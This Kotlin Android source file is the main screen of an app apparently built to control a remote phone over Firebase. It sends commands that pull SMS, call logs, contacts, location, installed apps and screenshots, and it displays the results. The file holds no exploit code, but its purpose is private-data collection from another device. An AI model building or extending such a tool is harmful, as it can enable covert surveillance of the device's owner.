package com.abuzahra.control

import android.os.Bundle
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.Fragment
import com.abuzahra.control.databinding.ActivityMainBinding
import com.abuzahra.control.model.CommandResult
import com.abuzahra.control.model.Device
import com.abuzahra.control.service.FirebaseService
import com.abuzahra.control.ui.dashboard.DashboardFragment
import com.abuzahra.control.ui.control.ControlFragment
import com.abuzahra.control.ui.smscalls.SmsCallsFragment
import com.abuzahra.control.ui.files.FilesFragment
import com.abuzahra.control.ui.social.SocialFragment
import com.abuzahra.control.ui.settings.SettingsFragment
import com.google.firebase.database.ValueEventListener

class MainActivity : AppCompatActivity() {
    
    private lateinit var binding: ActivityMainBinding
    private var currentFragment: Fragment? = null
    private var currentDevice: Device? = null
    private var resultListener: ValueEventListener? = null
    
    companion object {
        var selectedDevice: Device? = null
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        
        setupBottomNav()
        loadFragment(DashboardFragment())
        
        // Observe result panel close
        binding.ivCloseResult.setOnClickListener {
            binding.resultPanel.visibility = View.GONE
        }
    }
    
    private fun setupBottomNav() {
        binding.bottomNav.setOnItemSelectedListener { item ->
            when (item.itemId) {
                R.id.nav_dashboard -> loadFragment(DashboardFragment())
                R.id.nav_control -> loadFragment(ControlFragment())
                R.id.nav_sms_calls -> loadFragment(SmsCallsFragment())
                R.id.nav_files -> loadFragment(FilesFragment())
                R.id.nav_social -> loadFragment(SocialFragment())
                R.id.nav_settings -> loadFragment(SettingsFragment())
            }
            true
        }
    }
    
    private fun loadFragment(fragment: Fragment) {
        currentFragment = fragment
        supportFragmentManager.beginTransaction()
            .replace(R.id.fragmentContainer, fragment)
            .commit()
    }
    
    fun selectDevice(device: Device) {
        currentDevice = device
        selectedDevice = device
        updateTopBar(device)
        listenForResults(device)
    }
    
    private fun updateTopBar(device: Device) {
        binding.tvTopTitle.text = device.name.ifEmpty { device.model }
        binding.tvDeviceCount.text = if (device.isOnline) "متصل" else "غير متصل"
        binding.ivDeviceStatus.setBackgroundResource(
            if (device.isOnline) R.drawable.bg_status_online
            else R.drawable.bg_status_offline
        )
    }
    
    private fun listenForResults(device: Device) {
        // Remove old listener
        resultListener?.let { FirebaseService.removeResultListener(device.id, it) }
        
        resultListener = FirebaseService.listenForResult(device.id) { result ->
            if (result.status == "success" || result.status == "error") {
                runOnUiThread {
                    showResult(result)
                }
            }
        }
    }
    
    fun showResult(result: CommandResult) {
        binding.resultPanel.visibility = View.VISIBLE
        binding.tvResultTitle.text = when (result.command) {
            "get_sms" -> "📱 الرسائل"
            "get_calls" -> "📞 المكالمات"
            "get_contacts" -> "👤 جهات الاتصال"
            "get_location" -> "📍 الموقع"
            "get_info" -> "ℹ️ معلومات الجهاز"
            "get_battery" -> "🔋 البطارية"
            "get_apps" -> "📦 التطبيقات"
            "screenshot" -> "📸 لقطة الشاشة"
            else -> "📋 ${result.command}"
        }
        binding.tvResultContent.text = result.result
        
        if (result.result.length > 3000) {
            // For large results, just show a summary
            binding.tvResultContent.text = result.result.take(3000) + "\n\n... (تم اقتطاع النتيجة)"
        }
    }
    
    fun sendCommandToDevice(command: String, params: String = "") {
        val device = currentDevice ?: selectedDevice
        if (device == null) {
            Toast.makeText(this, "اختر جهازاً أولاً", Toast.LENGTH_SHORT).show()
            return
        }
        
        Toast.makeText(this, "جاري إرسال الأمر: $command", Toast.LENGTH_SHORT).show()
        
        FirebaseService.sendCommand(device.id, command, params) { success ->
            runOnUiThread {
                if (success) {
                    Toast.makeText(this, "تم إرسال الأمر ✅", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "فشل إرسال الأمر ❌", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        resultListener?.let { 
            currentDevice?.let { device -> FirebaseService.removeResultListener(device.id, it) }
        }
    }
}
